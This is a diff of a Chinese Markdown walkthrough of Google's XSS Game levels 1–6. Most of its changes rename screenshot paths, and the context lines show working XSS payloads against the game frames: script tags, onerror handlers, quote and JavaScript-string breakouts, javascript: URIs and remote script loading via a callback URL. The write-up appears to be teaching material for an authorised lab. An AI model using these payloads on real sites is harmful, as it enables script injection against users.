@@ -25,15 +25,15 @@ Google XSS Game 是 Google 官方提供的**授权教学靶场**。本文所有 
 1. 访问 `https://xss-game.appspot.com/level1/frame`。
 2. 在搜索框输入 `hello`，提交后观察 URL 变为 `?query=hello`，页面显示类似 “Sorry, no results for hello”。
 
-![1789801951400-e08d0d0c-0684-45b6-8935-aa2729fafe10.png](./img/285733123/1789801951400-e08d0d0c-0684-45b6-8935-aa2729fafe10-742395.png)
+![1789801951400-e08d0d0c-0684-45b6-8935-aa2729fafe10.png](./img/285733123/1789801951400-e08d0d0c-0684-45b6-8935-aa2729fafe10-423143.png)
 
 3. 输入 `<h1>test</h1>`，发现页面渲染出大标题，说明 HTML 被解析。
 
-![1789801972351-0210a2a7-081f-4c26-8a92-f38a3bb9d909.png](./img/285733123/1789801972351-0210a2a7-081f-4c26-8a92-f38a3bb9d909-128751.png)
+![1789801972351-0210a2a7-081f-4c26-8a92-f38a3bb9d909.png](./img/285733123/1789801972351-0210a2a7-081f-4c26-8a92-f38a3bb9d909-585930.png)
 
 4. 输入 `<script>alert(1)</script>`，弹窗出现。
 
-![1789802047081-f007e777-425f-4669-8093-e1a24be43150.png](./img/285733123/1789802047081-f007e777-425f-4669-8093-e1a24be43150-406438.png)
+![1789802047081-f007e777-425f-4669-8093-e1a24be43150.png](./img/285733123/1789802047081-f007e777-425f-4669-8093-e1a24be43150-683798.png)
 
 ### Payload
 
@@ -49,7 +49,7 @@ Google XSS Game 是 Google 官方提供的**授权教学靶场**。本文所有 
 https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert(1)%3C%2Fscript%3E
 ```
 
-![1789802022627-01e7781d-55b5-4348-b24c-4dd1b6e01161.png](./img/285733123/1789802022627-01e7781d-55b5-4348-b24c-4dd1b6e01161-063946.png)
+![1789802022627-01e7781d-55b5-4348-b24c-4dd1b6e01161.png](./img/285733123/1789802022627-01e7781d-55b5-4348-b24c-4dd1b6e01161-455522.png)
 
 ### 原理解析
 
@@ -79,16 +79,16 @@ https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert(1)%3C%2Fscript
 1. 访问 `https://xss-game.appspot.com/level2/frame`。
 2. 在留言框提交 `<script>alert(1)</script>`，发现消息显示为纯文本或标签被移除，没有弹窗。
 
-![1789802126249-c284543d-1ded-4c5e-a145-e05d2b44de50.png](./img/285733123/1789802126249-c284543d-1ded-4c5e-a145-e05d2b44de50-783264.png)
+![1789802126249-c284543d-1ded-4c5e-a145-e05d2b44de50.png](./img/285733123/1789802126249-c284543d-1ded-4c5e-a145-e05d2b44de50-092007.png)
 
 3. 打开开发者工具，查看 Elements 面板，发现消息内容被插入到某个容器中。
 
-![1789802198919-3820e8b7-e2aa-4c3f-bb5c-36c17fe841ca.png](./img/285733123/1789802198919-3820e8b7-e2aa-4c3f-bb5c-36c17fe841ca-113430.png)
+![1789802198919-3820e8b7-e2aa-4c3f-bb5c-36c17fe841ca.png](./img/285733123/1789802198919-3820e8b7-e2aa-4c3f-bb5c-36c17fe841ca-263357.png)
 
 4. 推测过滤规则：可能用正则替换了 `<script` 标签（大小写不敏感），但没有处理事件属性。
 5. 尝试提交 `<img src=x onerror=alert(1)>`，弹窗出现。
 
-![1789802354487-2e0927d1-8d41-4f9d-abf3-07a0549979de.png](./img/285733123/1789802354487-2e0927d1-8d41-4f9d-abf3-07a0549979de-201050.png)
+![1789802354487-2e0927d1-8d41-4f9d-abf3-07a0549979de.png](./img/285733123/1789802354487-2e0927d1-8d41-4f9d-abf3-07a0549979de-016658.png)
 
 ### Payload
 
@@ -100,7 +100,7 @@ https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert(1)%3C%2Fscript
 
 在留言框输入上述 Payload，提交后页面重新渲染消息，弹窗触发。刷新页面后，由于消息被存储，弹窗会再次触发。
 
-![1789802256963-a171cdee-6216-4551-bbd9-f309906e6f94.png](./img/285733123/1789802256963-a171cdee-6216-4551-bbd9-f309906e6f94-164970.png)
+![1789802256963-a171cdee-6216-4551-bbd9-f309906e6f94.png](./img/285733123/1789802256963-a171cdee-6216-4551-bbd9-f309906e6f94-593356.png)
 
 ### 原理解析
 
@@ -122,11 +122,11 @@ DOM 型反射 XSS（`location.hash` 被拼接到 HTML 属性中，再通过 jQue
 
 1. 访问 `https://xss-game.appspot.com/level3/frame#1`，页面显示一张图片。
 
-![1789802479322-b4b5a39e-80d5-4ae3-9f3d-91a2aff56b1b.png](./img/285733123/1789802479322-b4b5a39e-80d5-4ae3-9f3d-91a2aff56b1b-318571.png)
+![1789802479322-b4b5a39e-80d5-4ae3-9f3d-91a2aff56b1b.png](./img/285733123/1789802479322-b4b5a39e-80d5-4ae3-9f3d-91a2aff56b1b-877582.png)
 
 2. 将 `#1` 改为 `#abc`，图片消失或出现异常，说明 hash 值被用于构造图片路径。
 
-![1789802498302-1080139c-a3a5-4dad-8518-a3d1524a6101.png](./img/285733123/1789802498302-1080139c-a3a5-4dad-8518-a3d1524a6101-431828.png)
+![1789802498302-1080139c-a3a5-4dad-8518-a3d1524a6101.png](./img/285733123/1789802498302-1080139c-a3a5-4dad-8518-a3d1524a6101-048613.png)
 
 3. 查看源码（或开发者工具），找到类似逻辑：
 
@@ -140,7 +140,7 @@ if (hash) {
 
 4. 尝试输入 `#1' onerror='alert(1)`，弹窗出现。
 
-![1789802971995-6c35131d-36a1-47f6-9094-39ae9393ac17.png](./img/285733123/1789802971995-6c35131d-36a1-47f6-9094-39ae9393ac17-344164.png)
+![1789802971995-6c35131d-36a1-47f6-9094-39ae9393ac17.png](./img/285733123/1789802971995-6c35131d-36a1-47f6-9094-39ae9393ac17-198765.png)
 
 ### Payload
 
@@ -158,7 +158,7 @@ https://xss-game.appspot.com/level3/frame#1'%20onerror='alert(1)
 
 注意：`#` 后的空格需要编码为 `%20`，单引号可以保留。
 
-![1789802956270-10d3c6d2-d0ae-4f25-91fb-48bfd7665536.png](./img/285733123/1789802956270-10d3c6d2-d0ae-4f25-91fb-48bfd7665536-000052.png)
+![1789802956270-10d3c6d2-d0ae-4f25-91fb-48bfd7665536.png](./img/285733123/1789802956270-10d3c6d2-d0ae-4f25-91fb-48bfd7665536-068587.png)
 
 ### 原理解析
 
@@ -187,7 +187,7 @@ DOM 型反射 XSS（用户输入被拼接到 JavaScript 字符串上下文中，
 1. 访问 `https://xss-game.appspot.com/level4/frame?timer=1`，页面显示倒计时。
 2. 输入 `timer=abc`，页面出现 JavaScript 错误或倒计时异常。
 
-![1789803054285-1d506ecf-3849-4771-b6fa-41df23d645a6.png](./img/285733123/1789803054285-1d506ecf-3849-4771-b6fa-41df23d645a6-620853.png)
+![1789803054285-1d506ecf-3849-4771-b6fa-41df23d645a6.png](./img/285733123/1789803054285-1d506ecf-3849-4771-b6fa-41df23d645a6-867269.png)
 
 3. 查看源码，发现类似：
 
@@ -203,7 +203,7 @@ DOM 型反射 XSS（用户输入被拼接到 JavaScript 字符串上下文中，
 
 4. 尝试输入 `1');alert(1);//`，弹窗出现。
 
-![1789803243718-531c082e-7cf3-4fcc-bc52-5fcbec40dbf4.png](./img/285733123/1789803243718-531c082e-7cf3-4fcc-bc52-5fcbec40dbf4-869411.png)
+![1789803243718-531c082e-7cf3-4fcc-bc52-5fcbec40dbf4.png](./img/285733123/1789803243718-531c082e-7cf3-4fcc-bc52-5fcbec40dbf4-380337.png)
 
 ### Payload
 
@@ -219,7 +219,7 @@ DOM 型反射 XSS（用户输入被拼接到 JavaScript 字符串上下文中，
 https://xss-game.appspot.com/level4/frame?timer=1%27%29%3Balert%281%29%3B%2F%2F
 ```
 
-![1789803234397-ad7020bf-ca3a-4a8e-a6cb-d4cedbfdb36d.png](./img/285733123/1789803234397-ad7020bf-ca3a-4a8e-a6cb-d4cedbfdb36d-346808.png)
+![1789803234397-ad7020bf-ca3a-4a8e-a6cb-d4cedbfdb36d.png](./img/285733123/1789803234397-ad7020bf-ca3a-4a8e-a6cb-d4cedbfdb36d-229995.png)
 
 ### 原理解析
 
@@ -259,11 +259,11 @@ DOM 型反射 XSS（`javascript:` URI 注入到 `href` 属性）。
 
 1. 访问 `https://xss-game.appspot.com/level5/frame/signup?next=confirm`，页面显示一个“Next”按钮。
 
-![1789803395416-f19ac0f6-ae6b-418c-b996-5dea3a886813.png](./img/285733123/1789803395416-f19ac0f6-ae6b-418c-b996-5dea3a886813-739173.png)
+![1789803395416-f19ac0f6-ae6b-418c-b996-5dea3a886813.png](./img/285733123/1789803395416-f19ac0f6-ae6b-418c-b996-5dea3a886813-110308.png)
 
 2. 点击按钮，跳转到 `confirm` 页面。
 
-![1789803418428-9576d580-7cb9-46b6-bdb4-668772e5aca4.png](./img/285733123/1789803418428-9576d580-7cb9-46b6-bdb4-668772e5aca4-587991.png)
+![1789803418428-9576d580-7cb9-46b6-bdb4-668772e5aca4.png](./img/285733123/1789803418428-9576d580-7cb9-46b6-bdb4-668772e5aca4-053866.png)
 
 3. 查看源码，发现类似：
 
@@ -272,15 +272,15 @@ DOM 型反射 XSS（`javascript:` URI 注入到 `href` 属性）。
 
 ```
 
-![1789803567215-5ad8f187-1384-48b9-aff2-b38b9770ce9c.png](./img/285733123/1789803567215-5ad8f187-1384-48b9-aff2-b38b9770ce9c-464383.png)
+![1789803567215-5ad8f187-1384-48b9-aff2-b38b9770ce9c.png](./img/285733123/1789803567215-5ad8f187-1384-48b9-aff2-b38b9770ce9c-616727.png)
 
 4. 尝试 `next=<script>alert(1)</script>`，发现被过滤。
 
-![1789813872494-c8c8a523-05d1-4aa7-9fc7-05c5af53dd44.png](./img/285733123/1789813872494-c8c8a523-05d1-4aa7-9fc7-05c5af53dd44-839686.png)
+![1789813872494-c8c8a523-05d1-4aa7-9fc7-05c5af53dd44.png](./img/285733123/1789813872494-c8c8a523-05d1-4aa7-9fc7-05c5af53dd44-130294.png)
 
 5. 尝试 `next=javascript:alert(1)`，点击按钮后弹窗。
 
-![1789813772732-40572e7c-18b1-4bdb-9b43-ca4f2715ee54.png](./img/285733123/1789813772732-40572e7c-18b1-4bdb-9b43-ca4f2715ee54-109921.png)
+![1789813772732-40572e7c-18b1-4bdb-9b43-ca4f2715ee54.png](./img/285733123/1789813772732-40572e7c-18b1-4bdb-9b43-ca4f2715ee54-291147.png)
 
 ### Payload
 
@@ -298,9 +298,9 @@ https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
 
 页面加载后，点击“Next”按钮，弹窗触发。
 
-![1789813905848-bf04695e-6f51-41aa-99cb-2ad120a25929.png](./img/285733123/1789813905848-bf04695e-6f51-41aa-99cb-2ad120a25929-245855.png)
+![1789813905848-bf04695e-6f51-41aa-99cb-2ad120a25929.png](./img/285733123/1789813905848-bf04695e-6f51-41aa-99cb-2ad120a25929-226569.png)
 
-![1789814090334-e6bfe2a3-d91b-4c2a-ab20-6ee1afe1f0bb.png](./img/285733123/1789814090334-e6bfe2a3-d91b-4c2a-ab20-6ee1afe1f0bb-337903.png)
+![1789814090334-e6bfe2a3-d91b-4c2a-ab20-6ee1afe1f0bb.png](./img/285733123/1789814090334-e6bfe2a3-d91b-4c2a-ab20-6ee1afe1f0bb-021919.png)
 
 ### 原理解析
 
@@ -322,7 +322,7 @@ DOM 型反射 XSS（动态脚本加载，URL 校验不严谨）。
 
 1. 访问 `https://xss-game.appspot.com/level6/frame`。
 
-![1789814252124-2d82fc16-2c7b-4316-a5bc-5a0b54a19f1c.png](./img/285733123/1789814252124-2d82fc16-2c7b-4316-a5bc-5a0b54a19f1c-966284.png)
+![1789814252124-2d82fc16-2c7b-4316-a5bc-5a0b54a19f1c.png](./img/285733123/1789814252124-2d82fc16-2c7b-4316-a5bc-5a0b54a19f1c-854258.png)
 
 2. 在输入框输入 `https://example.com/alert.js`，页面提示只允许 `https://` 开头的 URL。
 3. 查看源码，发现类似：
@@ -385,11 +385,11 @@ https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
 https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
 ```
 
-![1789814644843-b7ea1273-3914-4e81-b9d3-9912259e4395.png](./img/285733123/1789814644843-b7ea1273-3914-4e81-b9d3-9912259e4395-326586.png)
+![1789814644843-b7ea1273-3914-4e81-b9d3-9912259e4395.png](./img/285733123/1789814644843-b7ea1273-3914-4e81-b9d3-9912259e4395-239817.png)
 
 2. 页面会加载并执行你的脚本，弹窗出现。
 
-![1789814628732-fdf015ed-9577-4f5e-bdaa-25aab39bc694.png](./img/285733123/1789814628732-fdf015ed-9577-4f5e-bdaa-25aab39bc694-422274.png)
+![1789814628732-fdf015ed-9577-4f5e-bdaa-25aab39bc694.png](./img/285733123/1789814628732-fdf015ed-9577-4f5e-bdaa-25aab39bc694-014712.png)
 
 ### 原理解析
 
@@ -422,3 +422,5 @@ https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
 ***
 
 
+> 更新: 2026-09-19 18:46:32  
+> 原文: <https://www.yuque.com/bmxq7n/mbc3yh9aprgoknpp>
